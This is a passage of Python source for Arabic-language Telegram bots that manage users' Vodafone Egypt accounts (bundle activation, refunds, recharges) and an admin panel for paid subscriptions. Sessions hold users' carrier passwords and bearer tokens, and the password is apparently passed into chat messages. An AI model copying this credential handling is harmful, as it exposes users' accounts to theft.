            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        execute_moneyback_refund(call, user_id, offer_index)
        return
    
    # معالجة أزرار اشتراكاتي
    if data.startswith("cancel_sub_"):
        item_key = data.split("_")[2]
        handle_cancel_subscription_callback(call, user_id, item_key)
        return
    
    if data == "cancel_my_subs":
        handle_cancel_my_subs(call, user_id)
        return
    
    # تأكيد تسجيل الخروج
    if data == "logout_confirm":
        if user_id in user_sessions:
            del user_sessions[user_id]
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        # حذف الباسورد المحفوظ عند تسجيل الخروج
        clear_saved_password(user_id)
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        user_bot.send_message(
            user_id,
            "👋 *تم تسجيل الخروج بنجاح*\n\nيمكنك تسجيل الدخول مجدداً باستخدام /start",
            parse_mode='Markdown',
            reply_markup=types.ReplyKeyboardRemove()
        )
        return
    
    # إلغاء تسجيل الخروج
    if data == "logout_cancel":
        user_bot.answer_callback_query(call.id, "تم الإلغاء ✅")
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        return
    
    # عروض ريح بالك - اختيار العرض
    if data.startswith("riha_offer_"):
        offer_index = data.split("_")[2]
        handle_riha_balak_offer_selection(call, user_id, offer_index)
        return
    
    # تأكيد عرض ريح بالك
    if data == "riha_balak_confirm":
        execute_riha_balak_offer(call, user_id)
        return
    
    # إلغاء عروض ريح بالك
    if data == "riha_balak_cancel":
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        user_bot.answer_callback_query(call.id, "تم الإلغاء")
        try:
            user_bot.edit_message_text(f"{EMOJI['cancel']} *تم إلغاء العملية*", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        except:
            pass
        return
    
    # تأكيد ريح بالك اجباري
    if data == "rahatabalk_confirm":
        execute_rahatabalk_egjbary(call, user_id)
        return
    
    # تأكيد تحويل 14 قرش
    if data == "convert14_confirm":
        execute_convert_14(call, user_id)
        return
    
    # تأكيد تفعيل 21000 فليكس
    if data == "activate21000_confirm":
        execute_activate_21000(call, user_id)
        return
    
    # تأكيد تفعيل باقة فليكس بعد اختيارها
    if data.startswith("flex_bundle_confirm_"):
        bundle_number = data.split("_")[3]
        execute_flex_bundle(call, user_id, bundle_number)
        return
    
    # معالجة أزرار نوته فليكس 15
    if data == "note15_option1":
        handle_note15_callback(call, user_id, "1")
        return
    if data == "note15_option2":
        handle_note15_callback(call, user_id, "2")
        return
    if data == "note15_option3":
        handle_note15_callback(call, user_id, "3")
        return
    if data == "back_to_note15":
        handle_note15_back(call, user_id)
        return
    
    # معالجة أزرار كروت فكه و مارد
    if data.startswith("buy_card_"):
        card_index = data.split("_")[2]
        handle_buy_card_callback(call, user_id, card_index)
        return
    
    # معالجة أزرار خصم فليكس
    if data.startswith("confirm_discount_"):
        parts = data.split("_")
        if len(parts) >= 3:
            product_id = parts[2]
            tariff_id = parts[3] if len(parts) > 3 else ""
            handle_confirm_discount_callback(call, user_id, product_id, tariff_id)
        return
    
    # ==================== أزرار الماني باك الجديدة (4 خيارات) ====================
    if data == "mb_details":
        handle_moneyback_details(call, user_id)
        return
    if data == "mb_refund":
        handle_moneyback_refund_menu(call, user_id)
        return
    if data == "mb_balance":
        handle_moneyback_balance(call, user_id)
        return
    if data == "mb_refresh":
        handle_moneyback_refresh(call, user_id)
        return
    if data == "mb_back":
        user_bot.answer_callback_query(call.id)
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        handle_moneyback_service(user_id)
        return

    # معالجة أزرار الماني باك
    if data.startswith("moneyback_refund_"):
        offer_index = data.split("_")[2]
        handle_moneyback_refund_callback(call, user_id, offer_index)
        return
    
    # معالجة أزرار شحن كارت
    if data == "recharge_same_phone":
        handle_recharge_phone_callback(call, user_id, 'same')
        return
    if data == "recharge_other_phone":
        handle_recharge_phone_callback(call, user_id, 'other')
        return
    
    # ==================== معالجة أزرار الاشتراك المدفوع ====================
    if data == "subscribe_now":
        user_bot.answer_callback_query(call.id)
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        send_subscription_instructions(call.message.chat.id, user_id)
        return

    if data == "sub_transferred":
        user_bot.answer_callback_query(call.id)
        username = call.from_user.username or ""
        bot_status['user_data'][user_id] = {
            'action': 'sub_waiting_phone_number',
            'username': username,
            'first_name': first_name
        }
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        user_bot.send_message(
            call.message.chat.id,
            f"📱 *أدخل رقم الهاتف الذي حولت منه المبلغ:*\n\n_(مثال: 01xxxxxxxxx)_",
            parse_mode='Markdown'
        )
        return

    if data.startswith("confirm_sub_"):
        req_id = int(data.split("_")[2])
        # جلب بيانات الطلب
        db.cursor.execute("SELECT user_id, username, first_name FROM subscription_requests WHERE id = ?", (req_id,))
        row = db.cursor.fetchone()
        if row:
            sub_user_id, sub_username, sub_first_name = row
            end_date = db.add_subscription(sub_user_id, sub_username, sub_first_name, months=1)
            db.cursor.execute("UPDATE subscription_requests SET status = 'approved' WHERE id = ?", (req_id,))
            db.conn.commit()
            try:
                user_bot.edit_message_caption(
                    f"✅ *تم قبول الاشتراك بنجاح*\n👤 المستخدم: {sub_first_name}\n🆔 ID: `{sub_user_id}`",
                    call.message.chat.id, call.message.message_id, parse_mode='Markdown'
                )
            except:
                user_bot.answer_callback_query(call.id, "تم قبول الطلب")
            try:
                user_bot.send_message(
                    sub_user_id,
                    f"✅ *تم قبول اشتراكك في البوت!*\n\n"
                    f"📅 الاشتراك صالح حتى: *{end_date.strftime('%Y-%m-%d')}*\n\n"
                    f"أرسل /start للبدء 🚀",
                    parse_mode='Markdown'
                )
            except:
                pass
        user_bot.answer_callback_query(call.id, "✅ تم قبول الاشتراك")
        return

    if data.startswith("reject_sub_"):
        req_id = int(data.split("_")[2])
        db.cursor.execute("SELECT user_id, first_name FROM subscription_requests WHERE id = ?", (req_id,))
        row = db.cursor.fetchone()
        if row:
            sub_user_id, sub_first_name = row
            db.cursor.execute("UPDATE subscription_requests SET status = 'rejected' WHERE id = ?", (req_id,))
            db.conn.commit()
            try:
                user_bot.edit_message_caption(
                    f"❌ *تم رفض طلب الاشتراك*\n👤 المستخدم: {sub_first_name}\n🆔 ID: `{sub_user_id}`",
                    call.message.chat.id, call.message.message_id, parse_mode='Markdown'
                )
            except:
                user_bot.answer_callback_query(call.id, "تم رفض الطلب")
            try:
                user_bot.send_message(
                    sub_user_id,
                    f"❌ *تم رفض طلب اشتراكك*\n\nيرجى التواصل مع المطور للمساعدة.",
                    parse_mode='Markdown'
                )
            except:
                pass
        user_bot.answer_callback_query(call.id, "❌ تم رفض الطلب")
        return

    if data == "check_subscription":
        subscribed, not_subscribed = check_subscription(user_id)
        if subscribed or user_id in ADMINS:
            logged_in, session = is_logged_in(user_id)
            if logged_in and session:
                welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
                try:
                    user_bot.delete_message(call.message.chat.id, call.message.message_id)
                except:
                    pass
                user_bot.send_message(call.message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=main_menu_markup())
            else:
                login_process(call.message, user_id, first_name)
                try:
                    user_bot.delete_message(call.message.chat.id, call.message.message_id)
                except:
                    pass
        else:
            markup = subscription_markup(not_subscribed)
            user_bot.edit_message_text(f"{EMOJI['lock']} *لا تزال غير مشترك*", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data == "re_login":
        if user_id in user_sessions:
            del user_sessions[user_id]
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        login_process(call.message, user_id, first_name)
    
    elif data == "back_to_main":
        logged_in, session = is_logged_in(user_id)
        if logged_in and session:
            welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
            try:
                user_bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
            user_bot.send_message(call.message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=main_menu_markup())
        else:
            user_bot.edit_message_text(f"{EMOJI['error']} *خطأ في الجلسة*\nيرجى إعادة تسجيل الدخول", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
            login_process(call.message, user_id, first_name)
            try:
                user_bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
    
    elif data == "flex_header_ignore":
        user_bot.answer_callback_query(call.id)
        return
    
    elif data.startswith("flex_bundle_") and not data.startswith("flex_bundle_confirm_"):
        bundle_number = data.split("_")[2]
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        handle_flex_bundle_selection(call, user_id, bundle_number)
    
    elif data.startswith("note_package_"):
        package_number = data.split("_")[2]
        handle_note_package_selection(call, user_id, package_number)
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif data.startswith("plus_package_"):
        package_index = data.split("_")[2]
        handle_plus_package_selection(call, user_id, package_index)
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif data.startswith("extreme_package_"):
        package_index = data.split("_")[2]
        handle_extreme_package_selection(call, user_id, package_index)
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif data.startswith("apps_package_"):
        package_index = data.split("_")[2]
        handle_apps_package_selection(call, user_id, package_index)
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif data.startswith("percent_"):
        percent = int(data.split("_")[1])
        if user_id in bot_status['user_data']:
            action = bot_status['user_data'][user_id].get('action', '')
            if action == 'send_invite_waiting_percent':
                handle_send_invite_percent(call, user_id, percent)
            elif action == 'change_percent_waiting_percent':
                handle_change_percent_percent(call, user_id, percent)
        user_bot.answer_callback_query(call.id, f"تم اختيار {percent}%")
    
    elif data == "confirm_mi_activate":
        handle_next_month_confirm(call, user_id)
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif data == "cancel_mi_activate":
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        user_bot.edit_message_text(f"{EMOJI['cancel']} *تم إلغاء العملية*", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif data == "cancel_action":
        # إلغاء عام لأي عملية جارية
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        logged_in, session = is_logged_in(user_id)
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        if logged_in and session:
            welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
            user_bot.send_message(call.message.chat.id, f"{EMOJI['cancel']} *تم إلغاء العملية*\n\n{welcome_text}", parse_mode='Markdown', reply_markup=main_menu_markup())
        else:
            user_bot.send_message(call.message.chat.id, f"{EMOJI['cancel']} *تم إلغاء العملية*", parse_mode='Markdown')
    
    elif data == "back_to_flex":
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_flex_bundles_service(user_id)
    
    elif data == "back_to_note":
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_note_packages_service(user_id)
    
    elif data == "back_to_plus":
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_plus_service(user_id)
    
    elif data == "back_to_extreme":
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_extreme_service(user_id)
    
    elif data == "back_to_apps":
        user_bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_apps_service(user_id)

# ==================== لوحة تحكم المطور ====================
@admin_bot.message_handler(commands=['start'])
def admin_start(message):
    if message.from_user.id not in ADMINS:
        admin_bot.reply_to(message, f"{EMOJI['error']} أنت لا تملك الصلاحية")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{EMOJI['stats']} الإحصائيات", callback_data="admin_stats"),
        types.InlineKeyboardButton(f"{EMOJI['edit']} إدارة الأقسام", callback_data="admin_sections"),
        types.InlineKeyboardButton(f"{EMOJI['tools']} إدارة الأزرار الرئيسية", callback_data="admin_main_buttons"),
        types.InlineKeyboardButton(f"{EMOJI['submenu']} إدارة الأزرار الفرعية", callback_data="admin_sub_buttons"),
        types.InlineKeyboardButton(f"{EMOJI['settings']} إعدادات البوت", callback_data="admin_settings"),
        types.InlineKeyboardButton(f"{EMOJI['broadcast']} بث رسالة", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users_manage"),
        types.InlineKeyboardButton("💳 إدارة الاشتراكات", callback_data="admin_subs_manage")
    )
    
    admin_bot.send_message(message.chat.id, f"{EMOJI['crown']} *لوحة التحكم الرئيسية*\n\nمرحباً بك يا مطور البوت {DEV_USERNAME}", parse_mode='Markdown', reply_markup=markup)

@admin_bot.callback_query_handler(func=lambda call: call.from_user.id in ADMINS)
def admin_handle_callbacks(call):
    global SUBSCRIPTION_ENABLED, SUBSCRIPTION_PRICE, VODAFONE_CASH_NUMBER
    data = call.data
    
    if data == "admin_stats":
        users_count = db.get_users_count()
        today_count = db.get_today_users_count()
        month_count = db.get_month_users_count()
        admin_bot.edit_message_text(
            f"{EMOJI['stats']} *الإحصائيات*\n\n👥 إجمالي المستخدمين: {users_count}\n📅 مستخدمين اليوم: {today_count}\n📆 مستخدمين الشهر: {month_count}",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_back_button()
        )
    
    elif data == "admin_sections":
        sections = db.get_all_level1()
        markup = types.InlineKeyboardMarkup(row_width=1)
        for sec_id, display, emoji, active, visible, pos in sections:
            status = f"{'🟢' if active else '🔴'}{'👁️' if visible else '👁️‍🗨️'}"
            markup.add(types.InlineKeyboardButton(text=f"{display} {status}", callback_data=f"admin_section_{sec_id}"))
        markup.row(types.InlineKeyboardButton(f"{EMOJI['add']} إضافة قسم", callback_data="admin_add_section"), types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back"))
        admin_bot.edit_message_text(f"{EMOJI['edit']} *الأقسام الرئيسية*", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_section_"):
        sec_id = int(data.split("_")[2])
        section = db.get_item_by_id(sec_id)
        if section:
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton(f"{'🟢' if section[7] else '🔴'} تفعيل/تعطيل", callback_data=f"admin_toggle_section_active_{sec_id}"),
                types.InlineKeyboardButton(f"{'👁️' if section[8] else '👁️‍🗨️'} إظهار/إخفاء", callback_data=f"admin_toggle_section_visible_{sec_id}"),
                types.InlineKeyboardButton(f"{EMOJI['delete']} حذف", callback_data=f"admin_delete_section_{sec_id}"),
                types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_sections")
            )
            admin_bot.edit_message_text(f"{section[3]}\nالتحكم في القسم:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data == "admin_main_buttons":
        sections = db.get_all_level1()
        markup = types.InlineKeyboardMarkup(row_width=1)
        for sec_id, display, emoji, active, visible, pos in sections:
            markup.add(types.InlineKeyboardButton(text=f"{display} - عرض الأزرار", callback_data=f"admin_main_buttons_in_{sec_id}"))
        markup.add(types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back"))
        admin_bot.edit_message_text(f"{EMOJI['tools']} *الأزرار الرئيسية*\nاختر القسم لعرض أزراره:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_main_buttons_in_"):
        sec_id = int(data.split("_")[4])
        buttons = db.get_all_level2(sec_id)
        section = db.get_item_by_id(sec_id)
        markup = types.InlineKeyboardMarkup(row_width=1)
        for btn_id, display, emoji, active, visible, pos in buttons:
            status = f"{'🟢' if active else '🔴'}{'👁️' if visible else '👁️‍🗨️'}"
            markup.add(types.InlineKeyboardButton(text=f"{display} {status}", callback_data=f"admin_main_button_{btn_id}"))
        markup.row(types.InlineKeyboardButton(f"{EMOJI['add']} إضافة زر", callback_data=f"admin_add_main_{sec_id}"), types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_main_buttons"))
        admin_bot.edit_message_text(f"{section[3]} - الأزرار الرئيسية", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_main_button_"):
        btn_id = int(data.split("_")[3])
        button = db.get_item_by_id(btn_id)
        if button:
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton(f"{'🟢' if button[7] else '🔴'} تفعيل/تعطيل", callback_data=f"admin_toggle_main_active_{btn_id}"),
                types.InlineKeyboardButton(f"{'👁️' if button[8] else '👁️‍🗨️'} إظهار/إخفاء", callback_data=f"admin_toggle_main_visible_{btn_id}"),
                types.InlineKeyboardButton(f"{EMOJI['delete']} حذف", callback_data=f"admin_delete_main_{btn_id}"),
                types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data=f"admin_main_buttons_in_{button[1]}")
            )
            admin_bot.edit_message_text(f"{button[3]}\nالتحكم في الزر الرئيسي:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data == "admin_sub_buttons":
        main_buttons = db.get_all_level2()
        markup = types.InlineKeyboardMarkup(row_width=1)
        for btn_id, display, emoji, active, visible, pos in main_buttons:
            markup.add(types.InlineKeyboardButton(text=f"{display} - عرض الأزرار الفرعية", callback_data=f"admin_sub_buttons_in_{btn_id}"))
        markup.add(types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back"))
        admin_bot.edit_message_text(f"{EMOJI['submenu']} *الأزرار الفرعية*\nاختر الزر الرئيسي لعرض أزراره الفرعية:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_sub_buttons_in_"):
        main_id = int(data.split("_")[4])
        subs = db.get_all_level3(main_id)
        main_btn = db.get_item_by_id(main_id)
        markup = types.InlineKeyboardMarkup(row_width=1)
        for sub_id, display, emoji, active, visible, pos in subs:
            status = f"{'🟢' if active else '🔴'}{'👁️' if visible else '👁️‍🗨️'}"
            markup.add(types.InlineKeyboardButton(text=f"{display} {status}", callback_data=f"admin_sub_button_{sub_id}"))
        markup.row(types.InlineKeyboardButton(f"{EMOJI['add']} إضافة زر فرعي", callback_data=f"admin_add_sub_{main_id}"), types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_sub_buttons"))
        admin_bot.edit_message_text(f"{main_btn[3]} - الأزرار الفرعية", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_sub_button_"):
        sub_id = int(data.split("_")[3])
        sub = db.get_item_by_id(sub_id)
        if sub:
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton(f"{'🟢' if sub[7] else '🔴'} تفعيل/تعطيل", callback_data=f"admin_toggle_sub_active_{sub_id}"),
                types.InlineKeyboardButton(f"{'👁️' if sub[8] else '👁️‍🗨️'} إظهار/إخفاء", callback_data=f"admin_toggle_sub_visible_{sub_id}"),
                types.InlineKeyboardButton(f"{EMOJI['edit']} تعديل المحتوى", callback_data=f"admin_edit_sub_content_{sub_id}"),
                types.InlineKeyboardButton(f"{EMOJI['delete']} حذف", callback_data=f"admin_delete_sub_{sub_id}"),
                types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data=f"admin_sub_buttons_in_{sub[1]}")
            )
            admin_bot.edit_message_text(f"{sub[3]}\nالتحكم في الزر الفرعي:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data == "admin_settings":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{'🟢' if bot_status['is_running'] else '🔴'} تشغيل/إيقاف البوت", callback_data="admin_toggle_bot"),
            types.InlineKeyboardButton(f"{'🟢' if bot_status['maintenance_mode'] else '🔴'} وضع الصيانة", callback_data="admin_toggle_maintenance"),
            types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back")
        )
        admin_bot.edit_message_text(f"{EMOJI['settings']} *إعدادات البوت*", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data == "admin_toggle_bot":
        bot_status['is_running'] = not bot_status['is_running']
        admin_bot.answer_callback_query(call.id, f"تم {'تشغيل' if bot_status['is_running'] else 'إيقاف'} البوت")
        show_admin_settings(call)
    
    elif data == "admin_toggle_maintenance":
        bot_status['maintenance_mode'] = not bot_status['maintenance_mode']
        admin_bot.answer_callback_query(call.id, f"تم {'تفعيل' if bot_status['maintenance_mode'] else 'إلغاء'} الصيانة")
        show_admin_settings(call)
    
    elif data == "admin_broadcast":
        bot_status['admin_action'] = 'waiting_broadcast'
        admin_bot.edit_message_text(f"{EMOJI['broadcast']} *البث للمستخدمين*\n\nأرسل الرسالة التي تريد بثها لجميع المستخدمين:\n(لإلغاء الأمر أرسل /cancel)", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif data == "admin_back":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{EMOJI['stats']} الإحصائيات", callback_data="admin_stats"),
            types.InlineKeyboardButton(f"{EMOJI['edit']} إدارة الأقسام", callback_data="admin_sections"),
            types.InlineKeyboardButton(f"{EMOJI['tools']} إدارة الأزرار الرئيسية", callback_data="admin_main_buttons"),
            types.InlineKeyboardButton(f"{EMOJI['submenu']} إدارة الأزرار الفرعية", callback_data="admin_sub_buttons"),
            types.InlineKeyboardButton(f"{EMOJI['settings']} إعدادات البوت", callback_data="admin_settings"),
            types.InlineKeyboardButton(f"{EMOJI['broadcast']} بث رسالة", callback_data="admin_broadcast"),
            types.InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users_manage"),
            types.InlineKeyboardButton("💳 إدارة الاشتراكات", callback_data="admin_subs_manage")
        )
        admin_bot.edit_message_text(f"{EMOJI['crown']} *لوحة التحكم الرئيسية*", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

    elif data == "admin_users_manage":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_block_user"),
            types.InlineKeyboardButton("✅ إلغاء حظر مستخدم", callback_data="admin_unblock_user"),
            types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back")
        )
        admin_bot.edit_message_text("👥 *إدارة المستخدمين*\n\nاختر الإجراء:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

    elif data == "admin_block_user":
        bot_status['admin_action'] = 'waiting_block_user_id'
        admin_bot.edit_message_text("🚫 *حظر مستخدم*\n\nأرسل الـ ID الخاص بالمستخدم المراد حظره:\n_(أرسل /cancel للإلغاء)_", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    elif data == "admin_unblock_user":
        bot_status['admin_action'] = 'waiting_unblock_user_id'
        admin_bot.edit_message_text("✅ *إلغاء حظر مستخدم*\n\nأرسل الـ ID الخاص بالمستخدم:\n_(أرسل /cancel للإلغاء)_", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    elif data == "admin_subs_manage":
        subs = db.get_all_subscribed_users()
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("➕ إضافة اشتراك لمستخدم", callback_data="admin_add_sub"),
            types.InlineKeyboardButton("➖ حذف اشتراك مستخدم", callback_data="admin_remove_sub"),
            types.InlineKeyboardButton("💰 تغيير سعر الاشتراك", callback_data="admin_change_sub_price"),
            types.InlineKeyboardButton("📱 تغيير رقم فودافون كاش", callback_data="admin_change_vodafone_cash"),
            types.InlineKeyboardButton(f"{'🟢 إيقاف نظام الاشتراك (مجاني الآن)' if SUBSCRIPTION_ENABLED else '🔴 تفعيل نظام الاشتراك (مدفوع)'}", callback_data="admin_toggle_subscription"),
            types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back")
        )
        admin_bot.edit_message_text(
            f"💳 *إدارة الاشتراكات*\n\n"
            f"💰 السعر الحالي: *{SUBSCRIPTION_PRICE} جنيه/شهر*\n"
            f"📱 رقم فودافون كاش: `{VODAFONE_CASH_NUMBER}`\n"
            f"👥 عدد المشتركين النشطين: *{len(subs)}*\n"
            f"🔄 الحالة: *{'مدفوع' if SUBSCRIPTION_ENABLED else 'مجاني'}*",
            call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup
        )

    elif data == "admin_toggle_subscription":
        SUBSCRIPTION_ENABLED = not SUBSCRIPTION_ENABLED
        status_text = "مدفوع 💳" if SUBSCRIPTION_ENABLED else "مجاني للجميع 🆓"
        admin_bot.answer_callback_query(call.id, f"تم تحويل البوت إلى {status_text}")
        # إعادة عرض صفحة الاشتراكات
        call.data = "admin_subs_manage"
        subs = db.get_all_subscribed_users()
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("➕ إضافة اشتراك لمستخدم", callback_data="admin_add_sub"),
            types.InlineKeyboardButton("➖ حذف اشتراك مستخدم", callback_data="admin_remove_sub"),
            types.InlineKeyboardButton("💰 تغيير سعر الاشتراك", callback_data="admin_change_sub_price"),
            types.InlineKeyboardButton("📱 تغيير رقم فودافون كاش", callback_data="admin_change_vodafone_cash"),
            types.InlineKeyboardButton(f"{'🟢 إيقاف نظام الاشتراك (مجاني الآن)' if SUBSCRIPTION_ENABLED else '🔴 تفعيل نظام الاشتراك (مدفوع)'}", callback_data="admin_toggle_subscription"),
            types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back")
        )
        admin_bot.edit_message_text(
            f"💳 *إدارة الاشتراكات*\n\n"
            f"💰 السعر الحالي: *{SUBSCRIPTION_PRICE} جنيه/شهر*\n"
            f"📱 رقم فودافون كاش: `{VODAFONE_CASH_NUMBER}`\n"
            f"👥 عدد المشتركين النشطين: *{len(subs)}*\n"
            f"🔄 الحالة: *{'مدفوع' if SUBSCRIPTION_ENABLED else 'مجاني'}*",
            call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup
        )

    elif data == "admin_add_sub":
        bot_status['admin_action'] = 'waiting_add_sub_user_id'
        admin_bot.edit_message_text("➕ *إضافة اشتراك*\n\nأرسل الـ ID الخاص بالمستخدم:\n_(أرسل /cancel للإلغاء)_", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    elif data == "admin_remove_sub":
        bot_status['admin_action'] = 'waiting_remove_sub_user_id'
        admin_bot.edit_message_text("➖ *حذف اشتراك*\n\nأرسل الـ ID الخاص بالمستخدم:\n_(أرسل /cancel للإلغاء)_", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    elif data == "admin_change_sub_price":
        bot_status['admin_action'] = 'waiting_new_sub_price'
        admin_bot.edit_message_text(f"💰 *تغيير سعر الاشتراك*\n\nالسعر الحالي: *{SUBSCRIPTION_PRICE} جنيه*\n\nأرسل السعر الجديد (أرقام فقط):\n_(أرسل /cancel للإلغاء)_", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    elif data == "admin_change_vodafone_cash":
        bot_status['admin_action'] = 'waiting_new_vodafone_cash'
        admin_bot.edit_message_text(f"📱 *تغيير رقم فودافون كاش*\n\nالرقم الحالي: `{VODAFONE_CASH_NUMBER}`\n\nأرسل الرقم الجديد:\n_(أرسل /cancel للإلغاء)_", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif data.startswith("admin_toggle_section_active_"):
        sec_id = int(data.split("_")[4])
        section = db.get_item_by_id(sec_id)
        if section:
            new_status = 0 if section[7] == 1 else 1
            db.update_item_status(sec_id, "is_active", new_status)
            admin_bot.answer_callback_query(call.id, f"تم {'تعطيل' if new_status == 0 else 'تفعيل'} القسم")
            show_section(call, sec_id)
    
    elif data.startswith("admin_toggle_section_visible_"):
        sec_id = int(data.split("_")[4])
        section = db.get_item_by_id(sec_id)
        if section:
            new_status = 0 if section[8] == 1 else 1
            db.update_item_status(sec_id, "is_visible", new_status)
            admin_bot.answer_callback_query(call.id, f"تم {'إخفاء' if new_status == 0 else 'إظهار'} القسم")
            show_section(call, sec_id)
    
    elif data.startswith("admin_toggle_main_active_"):
        btn_id = int(data.split("_")[4])
        button = db.get_item_by_id(btn_id)
        if button:
            new_status = 0 if button[7] == 1 else 1
            db.update_item_status(btn_id, "is_active", new_status)
            admin_bot.answer_callback_query(call.id, f"تم {'تعطيل' if new_status == 0 else 'تفعيل'} الزر")
            show_main_button(call, btn_id)
    
    elif data.startswith("admin_toggle_main_visible_"):
        btn_id = int(data.split("_")[4])
        button = db.get_item_by_id(btn_id)
        if button:
            new_status = 0 if button[8] == 1 else 1
            db.update_item_status(btn_id, "is_visible", new_status)
            admin_bot.answer_callback_query(call.id, f"تم {'إخفاء' if new_status == 0 else 'إظهار'} الزر")
            show_main_button(call, btn_id)
    
    elif data.startswith("admin_toggle_sub_active_"):
        sub_id = int(data.split("_")[4])
        sub = db.get_item_by_id(sub_id)
        if sub:
            new_status = 0 if sub[7] == 1 else 1
            db.update_item_status(sub_id, "is_active", new_status)
            admin_bot.answer_callback_query(call.id, f"تم {'تعطيل' if new_status == 0 else 'تفعيل'} الزر الفرعي")
            show_sub_button(call, sub_id)
    
    elif data.startswith("admin_toggle_sub_visible_"):
        sub_id = int(data.split("_")[4])
        sub = db.get_item_by_id(sub_id)
        if sub:
            new_status = 0 if sub[8] == 1 else 1
            db.update_item_status(sub_id, "is_visible", new_status)
            admin_bot.answer_callback_query(call.id, f"تم {'إخفاء' if new_status == 0 else 'إظهار'} الزر الفرعي")
            show_sub_button(call, sub_id)
